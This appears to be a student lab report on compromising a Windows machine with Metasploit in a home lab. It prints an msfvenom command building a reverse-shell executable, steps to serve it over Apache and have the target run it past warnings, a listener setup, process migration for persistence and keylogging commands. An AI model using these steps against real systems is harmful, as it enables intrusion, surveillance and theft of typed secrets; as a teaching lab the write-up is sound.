# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By
- **Moenish Baalan G**
- **212223220057**
# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

![374794141-b98e3dbe-cbf4-465e-83aa-f1ac913b2a51](https://github.com/user-attachments/assets/aeb23eb6-9b7c-4222-b79d-4cd6b517e7ea)

Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
![374794574-094f111d-38e4-47a4-b950-8c0544a3463e](https://github.com/user-attachments/assets/0e860edc-4818-475f-899d-0f5966853ceb)



copy the fun.exe into the apache ```/var/www/html ```folder
![374794668-1a19f712-d904-4e9a-9c3f-a0f824215d01](https://github.com/user-attachments/assets/b8270df3-4cb6-4079-8097-aa644b469f5e)


Start apache server ```sudo systemctl apache2 start``` 
![374794788-2944d067-02b2-43fc-9487-5f9e71c393b7](https://github.com/user-attachments/assets/6172b1a7-8925-4d66-b51d-6e7767e3e89c)


Check the status of apache2 ```sudo apache2 status```
![374794908-1577dcc8-8e32-4080-8459-521367056dc0](https://github.com/user-attachments/assets/0bd96436-de43-43a6-8303-0894f0792d3b)


Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
![374795103-d6bd1bdb-3064-45e8-b6b1-e22d2e80209f](https://github.com/user-attachments/assets/f75933b9-969b-4bb7-9ef1-ac8ec7229282)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
![374795180-7be60e9f-2ce3-487a-9668-8bdb282e8931](https://github.com/user-attachments/assets/15185f4f-af3a-4c21-8d7f-9faf20d10382)


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![374795286-596d3916-66f9-4605-8ae4-5dd21116b77a](https://github.com/user-attachments/assets/be00ebc6-60d6-44f5-ae86-99072015a8ca)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![374795471-d53176fa-7af0-4f05-b526-91713074335d](https://github.com/user-attachments/assets/3a036de6-373f-4a39-b08f-b46d2a2406e1)

keyscan_dump Shows the keystrokes captured so far
![374795532-ec7c391d-62a6-4fdc-a2c3-ef383b6c8a57](https://github.com/user-attachments/assets/2e594854-8992-446c-b4ce-90894b5d7d4a)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
